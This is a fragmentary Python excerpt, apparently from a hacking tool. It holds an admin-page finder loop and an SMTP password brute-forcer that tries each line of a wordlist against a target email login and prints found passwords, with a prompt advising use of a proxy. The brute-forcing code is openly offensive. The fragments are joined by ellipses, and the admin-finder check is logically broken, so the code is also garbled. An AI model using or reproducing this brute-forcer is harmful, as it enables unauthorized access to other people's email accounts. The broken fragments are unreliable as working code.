...
""")
    ...
    for admin in random_pages :
        website = page + admin
        if website == page :
            print("[+] Admin Page Found >> ", website)
...
------------------
 [$] Please Use Proxy """)
    ...
    for Password1 in Passwordfile_open :
        try:
            smtpserver.login(email, Password1)
            print("[+] Password Found >> ",Password1)
            break

        except smtplib.SMTPAuthenticationError :
            print("[!] Password is Incorrect >> ",Password1)
    ...
    email2 = input("[*] Enter The Target Email : ")
    Passwordfile2 = input("[*] Enter Password File : ")
    Passwordfile2 = open(Passwordfile2, "r")

    for Password2 in Passwordfile2 :
        try:
            smtpserver.login(email2, Password2)
            print("[+] Password Found >> ",Password2)
            break
